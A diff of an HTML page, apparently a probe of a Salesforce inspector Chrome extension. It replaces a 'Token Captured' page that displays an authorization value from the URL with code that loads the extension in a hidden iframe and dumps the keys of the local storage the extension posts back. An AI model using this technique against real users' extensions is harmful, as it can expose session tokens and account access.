@@ -1,25 +1,85 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Token Captured</title>
-    <script>
-        // Log the token and redirect if needed
-        window.addEventListener('load', () => {
-            const urlParams = new URLSearchParams(window.location.search);
-            const authHeader = urlParams.get('authorization');
-            
-            if (authHeader) {
-                console.log('Authorization Header:', authHeader);
-                // You could also send this to your server or handle it however you need
-                document.body.innerHTML = `
-                    <h2>Token Captured!</h2>
-                    <pre>${authHeader}</pre>
-                `;
-            }
-        });
-    </script>
+    <title>SFDC Inspector Token Debug</title>
+    <style>
+        body { font-family: system-ui; max-width: 800px; margin: 20px auto; padding: 20px; }
+        #messages { background: #f5f5f5; padding: 15px; border-radius: 4px; margin-bottom: 20px; }
+        #requestInfo { background: #e3f2fd; padding: 15px; border-radius: 4px; margin-top: 20px; }
+        .explorer-frame { width: 100%; height: 600px; border: 1px solid #ccc; margin-top: 20px; }
+        pre { white-space: pre-wrap; }
+    </style>
 </head>
 <body>
-    <h2>Processing...</h2>
+    <div id="messages">Initializing...</div>
+    <div id="requestInfo"></div>
+    <script>
+        const messagesDiv = document.getElementById('messages');
+        const requestInfoDiv = document.getElementById('requestInfo');
+
+        // Create direct link to REST Explorer with parameters
+        function createExplorerUrl() {
+            const params = new URLSearchParams({
+                endpoint: '/services/data/v61.0/query/?q=SELECT Id,Name FROM Account LIMIT 1',
+                format: 'json',
+                method: 'GET'
+            });
+            
+            // Using hash routing for REST explorer
+            return `chrome-extension://apfebnafilpofmbeebponacgbdhnkmnl/popup.html#/restexplorer?${params.toString()}`;
+        }
+
+        // Log all received messages
+        window.addEventListener('message', function(event) {
+            console.log('Received message:', event.data);
+            
+            requestInfoDiv.innerHTML += `
+                <h3>Received Message:</h3>
+                <pre>${JSON.stringify(event.data, null, 2)}</pre>
+            `;
+
+            if (event.data.insextInitRequest) {
+                messagesDiv.innerHTML = '<h3>Extension Connected!</h3>';
+                
+                const storage = event.data.iFrameLocalStorage || {};
+                console.log('Storage:', storage);
+                
+                // Log all storage keys
+                const keys = Object.keys(storage);
+                messagesDiv.innerHTML += `
+                    <h4>Storage Keys Found:</h4>
+                    <pre>${JSON.stringify(keys, null, 2)}</pre>
+                `;
+
+                // Create and display the explorer URL
+                const explorerUrl = createExplorerUrl();
+                messagesDiv.innerHTML += `
+                    <h4>REST Explorer URL:</h4>
+                    <pre>${explorerUrl}</pre>
+                `;
+
+                // Create a visible frame for the REST Explorer
+                const frame = document.createElement('iframe');
+                frame.src = explorerUrl;
+                frame.className = 'explorer-frame';
+                document.body.appendChild(frame);
+
+                // Add direct link as backup
+                const directLink = document.createElement('a');
+                directLink.href = explorerUrl;
+                directLink.target = '_blank';
+                directLink.textContent = 'Open REST Explorer in new tab';
+                document.body.appendChild(directLink);
+            }
+        });
+
+        // Load the extension
+        console.log('Creating init frame...');
+        const initFrame = document.createElement('iframe');
+        initFrame.src = 'chrome-extension://apfebnafilpofmbeebponacgbdhnkmnl/popup.html';
+        initFrame.style.display = 'none';
+        document.body.appendChild(initFrame);
+        console.log('Init frame created');
+    </script>
 </body>
 </html>
